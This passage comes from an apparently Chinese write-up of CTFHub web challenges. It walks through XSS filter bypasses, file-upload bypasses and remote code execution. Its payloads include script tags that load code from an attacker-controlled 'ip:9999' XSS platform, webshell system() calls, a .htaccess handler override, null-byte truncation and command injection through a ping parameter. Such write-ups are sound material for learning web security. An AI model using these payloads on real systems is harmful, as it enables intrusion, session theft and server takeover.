<span class="hljs-string">//这样的话我们就将前面的script标签进行了闭合,后续通过//进行注释,我们的js代码得以成功执行</span>
<span class="hljs-string">//接下来将上列payload替换为我们xss平台的代码即可,最后将得到的url提交给bot让其点击,观察平台响应即可</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221161746779.png" alt="image-20231221161746779"></p>
<p>成功拿到flag</p>
<h3 id="xss-dom跳转">XSS-DOM跳转</h3>
<p>这里也是有点蒙蔽，就看wp了</p>
<pre><code class="hljs js">&lt;script&gt;
    	<span class="hljs-comment">//获取了当前页面的URL查询部分（即location.search）</span>
        <span class="hljs-keyword">var</span> target = location.<span class="hljs-property">search</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">"="</span>)
<span class="hljs-comment">//然后使用split("=")方法将查询参数分割成数组。这将导致target变量包含一个数组，其中第一个元素是查询参数名，第二个元素是查询参数值。</span>
		<span class="hljs-comment">//它检查数组的第一个元素的剥离后是否等于字符串"jumpto"</span>
		<span class="hljs-comment">//slice(1)是用来去掉参数名前面的问号字符("?")的</span>
        <span class="hljs-keyword">if</span> (target[<span class="hljs-number">0</span>].<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>) == <span class="hljs-string">"jumpto"</span>) {
            <span class="hljs-comment">//将页面的location.href属性设置为查询参数的值，从而导致页面重定向到该值所指定的URL。</span>
            location.<span class="hljs-property">href</span> = target[<span class="hljs-number">1</span>];
        }
&lt;/script&gt;</code></pre>
<p>这里是漏洞点，可见这里我们需要get传一个<code>jumpto</code>的参数，并在=后面附上我们的恶意js代码，但此处我并不清楚如何添加，看了wp发现是知识盲区：</p>
<p>注意！当你将类似于 location.href = “javascript:alert(‘xss’)” 这样的代码赋值给 location.href 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。</p>
<p>所以有如下payload：</p>
<pre><code class="hljs js"><span class="hljs-attr">http</span>:<span class="hljs-comment">//challenge-a0657aa32a9d9134.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript("//ip:9999//9GXMk4")</span></code></pre>
<p>这段代码使用了 jQuery 的 <code>$.getScript()</code> 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221163932085.png" alt="image-20231221163932085"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221163853220.png" alt="image-20231221163853220"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221163840285.png" alt="image-20231221163840285"></p>
<p>拿到flag</p>
<h3 id="xss-过滤空格">XSS-过滤空格</h3>
<p>简单测试一下知道过滤了空格，查询一番可以知道通过/**/或者/符号即可绕过，原始payload如下：</p>
<pre><code class="hljs js">&lt;<span class="hljs-regexp">/textarea&gt;'"&gt;&lt;script src=http:/</span><span class="hljs-regexp">/ip:9999/</span>9GXMk4&gt;&lt;/script&gt;</code></pre>
<p>修改如下：</p>
<pre><code class="hljs js">&lt;<span class="hljs-regexp">/textarea&gt;'"&gt;&lt;script/</span>src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//ip:9999/9GXMk4&gt;&lt;/script&gt;</span></code></pre>
<p>之后老办法即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231221165025048.png" alt="image-20231221165025048"></p>
<h3 id="xss-过滤关键词">XSS-过滤关键词</h3>
<p>简单测试知道过滤了script关键词，尝试双写成功绕过。</p>
<pre><code class="hljs js">&lt;<span class="hljs-regexp">/textarea&gt;'"&gt;&lt;scriscriptpt/</span>src=<span class="hljs-attr">http</span>:<span class="hljs-comment">//ip:9999/9GXMk4&gt;&lt;/scriscriptpt&gt;</span></code></pre>
<h2 id="文件上传">文件上传</h2>
<h3 id="无验证">无验证</h3>
<p>题目说没有过滤，直接传入一句话上传即可，如下图，文件上传路径也得知了，直接访问。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222140155631.png" alt="image-20231222140155631"></p>
<pre><code class="hljs php"><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'cat /var/www/html/flag_1916225392.php'</span>);</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222140558101.png" alt="image-20231222140558101"></p>
<h3 id="前端验证">前端验证</h3>
<p>这里上传php后缀文件会发现被前端的js禁止了，那我们修改后缀为其指定的，随后抓包修改即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222140941551.png" alt="image-20231222140941551"></p>
<p>成功上传</p>
<pre><code class="hljs php"><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'cat /var/www/html/flag_985418763.php'</span>);</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222141056675.png" alt="image-20231222141056675"></p>
<h3 id="htaccess">.htaccess</h3>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p>如果我们用上一关的思路会发现行不通，其在后端进行了后缀名的验证</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'submit'</span>])) {
    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]);
    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$name</span>)[<span class="hljs-string">'extension'</span>];
    <span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>, <span class="hljs-string">"php7"</span>, <span class="hljs-string">"php5"</span>, <span class="hljs-string">"php4"</span>, <span class="hljs-string">"php3"</span>, <span class="hljs-string">"phtml"</span>, <span class="hljs-string">"pht"</span>, <span class="hljs-string">"jsp"</span>, <span class="hljs-string">"jspa"</span>, <span class="hljs-string">"jspx"</span>, <span class="hljs-string">"jsw"</span>, <span class="hljs-string">"jsv"</span>, <span class="hljs-string">"jspf"</span>, <span class="hljs-string">"jtml"</span>, <span class="hljs-string">"asp"</span>, <span class="hljs-string">"aspx"</span>, <span class="hljs-string">"asa"</span>, <span class="hljs-string">"asax"</span>, <span class="hljs-string">"ascx"</span>, <span class="hljs-string">"ashx"</span>, <span class="hljs-string">"asmx"</span>, <span class="hljs-string">"cer"</span>, <span class="hljs-string">"swf"</span>);
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$blacklist</span>)) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>], UPLOAD_PATH . <span class="hljs-variable">$name</span>)) {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('上传成功')&lt;/script&gt;"</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"上传文件相对路径&lt;br&gt;"</span> . UPLOAD_URL_PATH . <span class="hljs-variable">$name</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('上传失败')&lt;/script&gt;"</span>;
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('文件类型不匹配')&lt;/script&gt;"</span>;
    }
}</code></pre>
<p>我们可以看到上述过滤的后缀很多，但是没有过滤.htaccess，那我们上传即可，内容如下</p>
<pre><code class="hljs php">AddType application/x-httpd-php .bcx</code></pre>
<p>这意味着如果我们上传后缀名为.bcx的文件，其服务器会将其内容按照php解析。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222141700371.png" alt="image-20231222141700371"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222141731681.png" alt="image-20231222141731681"></p>
<pre><code class="hljs php"><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'cat /var/www/html/flag_2427815270.php'</span>);</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222141816824.png" alt="image-20231222141816824"></p>
<h3 id="mime绕过">MIME绕过</h3>
<p>这里进行了MIME类型的检测</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222142002557.png" alt="image-20231222142002557"></p>
<p>我们直接修改Content-Type即可</p>
<pre><code class="hljs php"><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'cat /var/www/html/flag_324517797.php'</span>);</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222142110464.png" alt="image-20231222142110464"></p>
<h3 id="文件头检查">文件头检查</h3>
<p>这里限制了文件头也就是不能&lt;?php开头了，那我们以GIF89a开头即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222142332612.png" alt="image-20231222142332612"></p>
<pre><code class="hljs php"><span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">'cat /var/www/html/flag_31822842.php'</span>);</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222142435043.png" alt="image-20231222142435043"></p>
<h3 id="00截断">00截断</h3>
<p>这里题目说是利用00截断，原理就是空字符在C语言中会被当做字符串结束的标志，而php底层是C实现的，那也就是说php也可以用00来代表截断，不过此方法有PHP版本限制</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222143107989.png" alt="image-20231222143107989"></p>
<p>我们随便上传个文件抓包可以看到如下图，这里增加了一个参数导致我们可以随意控制文件上传路径，那我们直接在路径后面做出如下修改</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222143014229.png" alt="image-20231222143014229"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222143243099.png" alt="image-20231222143243099"></p>
<p>这里注意空字符用%00代替，随后直接上传即可，这里如果我们的文件名为1.jpg之类的，那上传后为<code>shell.php%001.jpg</code>这里上传至服务器之后，它会将后面的1.jpg忽略，从而我们可以绕过。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222143453476.png" alt="image-20231222143453476"></p>
<h3 id="双写后缀">双写后缀</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222143857725.png" alt="image-20231222143857725"></p>
<p>这里上传看了一下发现后缀php被替换为空了，但下面给了我们提示代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]);
<span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">"php"</span>, <span class="hljs-string">"php5"</span>, <span class="hljs-string">"php4"</span>, <span class="hljs-string">"php3"</span>, <span class="hljs-string">"phtml"</span>, <span class="hljs-string">"pht"</span>, <span class="hljs-string">"jsp"</span>, <span class="hljs-string">"jspa"</span>, <span class="hljs-string">"jspx"</span>, <span class="hljs-string">"jsw"</span>, <span class="hljs-string">"jsv"</span>, <span class="hljs-string">"jspf"</span>, <span class="hljs-string">"jtml"</span>, <span class="hljs-string">"asp"</span>, <span class="hljs-string">"aspx"</span>, <span class="hljs-string">"asa"</span>, <span class="hljs-string">"asax"</span>, <span class="hljs-string">"ascx"</span>, <span class="hljs-string">"ashx"</span>, <span class="hljs-string">"asmx"</span>, <span class="hljs-string">"cer"</span>, <span class="hljs-string">"swf"</span>, <span class="hljs-string">"htaccess"</span>, <span class="hljs-string">"ini"</span>);
<span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">""</span>, <span class="hljs-variable">$name</span>);</code></pre>
<p>这里将黑名单中的替换为空，和明显可以双写绕过</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222144054449.png" alt="image-20231222144054449"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222144135376.png" alt="image-20231222144135376"></p>
<h2 id="rce">RCE</h2>
<h3 id="eval执行">eval()执行</h3>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'cmd'</span>])) {
    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"cmd"</span>]);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>没有任何过滤</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222144329592.png" alt="image-20231222144329592"></p>
<p>最后cat读取即可</p>
<h3 id="文件包含">文件包含</h3>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>], <span class="hljs-string">"flag"</span>)) {
        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!!!"</span>;
    }
} <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span>
&lt;hr&gt;
i have a &lt;a href=<span class="hljs-string">"shell.txt"</span>&gt;shell&lt;/a&gt;, how to <span class="hljs-keyword">use</span> <span class="hljs-title">it</span> ?
<span class="hljs-title">i</span> <span class="hljs-title">have</span> <span class="hljs-title">a</span> <span class="hljs-title">shell</span>, <span class="hljs-title">how</span> <span class="hljs-title">to</span> <span class="hljs-title">use</span> <span class="hljs-title">it</span> ?</code></pre>
<p>这里限制了flag的出现，strpos是用于寻找file参数中是否存在flag敏感字符。</p>
<p>那我们传入一句话即可，这里用他提供的shell.txt了，因为include会执行传入的文件中的php代码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222144917742.png" alt="image-20231222144917742"></p>
<p>最后读取即可</p>
<h3 id="phpinput">php://input</h3>
<p>使用题目描述的php伪协议的前提就是，下面的include那个参数为on</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222145527575.png" alt="image-20231222145527575"></p>
<p>接着我们构造payload即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222145640981.png" alt="image-20231222145640981"></p>
<h3 id="远程包含">远程包含</h3>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>], <span class="hljs-string">"flag"</span>)) {
        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Hacker!!!"</span>;
    }
} <span class="hljs-keyword">else</span> {
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span>
&lt;hr&gt;
i don<span class="hljs-string">'t have shell, how to get flag?&lt;br&gt;</span>
<span class="hljs-string">&lt;a href="phpinfo.php"&gt;phpinfo&lt;/a&gt;</span>
<span class="hljs-string">i don'</span>t have shell, how to get flag?
phpinfo</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222145935363.png" alt="image-20231222145935363"></p>
<p>我们看到值为on可以进行远程文件包含，我们直接将其包含我们vps上的恶意文件即可注意恶意文件的后缀不可为php</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222150603576.png" alt="image-20231222150603576"></p>
<p>或者采用上一关的php://input也可</p>
<h3 id="读取源代码">读取源代码</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231222151109422.png" alt="image-20231222151109422"></p>
<p>直接php伪协议读取即可</p>
<h3 id="命令注入">命令注入</h3>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ip'</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ip'</span>]) {
    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">"ping -c 4 <span class="hljs-subst">{$_GET['ip']}</span>"</span>;
    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);
}
<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>) {
    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$res</span>);
}
<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs bash">ip=127.0.0.1|<span class="hljs-built_in">ls</span>
ip=127.0.0.1|<span class="hljs-built_in">cat</span> 3475247317307.php</code></pre>
